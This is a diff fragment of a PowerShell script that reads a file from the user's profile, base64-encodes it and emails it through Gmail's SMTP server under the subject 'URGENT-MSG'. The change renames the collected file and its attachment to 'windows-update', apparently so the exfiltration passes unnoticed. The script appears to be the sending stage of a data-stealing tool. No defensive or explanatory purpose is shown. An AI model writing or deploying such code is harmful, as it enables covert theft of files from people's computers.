@@ -6,7 +6,7 @@ $Subject = 'URGENT-MSG'
 $Body = 'PLEASE CHECK THE ATTACHED FILE'
 $SMTPServer = 'smtp.gmail.com'
 $SMTPPort = 587
-$Attachment = 'C:\Users\Xphar\Desktop\galorgvur.txt'
+$Attachment = '$env:USERPROFILE\Documents\windows-update'
 
 $SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
 $SMTPClient.EnableSsl = $true
@@ -15,7 +15,7 @@ $Message = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject
 $AttachmentData = [System.IO.File]::ReadAllBytes($Attachment)
 $AttachmentBase64 = [System.Convert]::ToBase64String($AttachmentData)
 $AttachmentStream = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String($AttachmentBase64))
-$Attachment = New-Object System.Net.Mail.Attachment($AttachmentStream, 'galorgvur.txt', 'application/octet-stream')
+$Attachment = New-Object System.Net.Mail.Attachment($AttachmentStream, 'windows-update', 'application/octet-stream')
 $Message.Attachments.Add($Attachment)
 
 $SMTPClient.Send($Message)
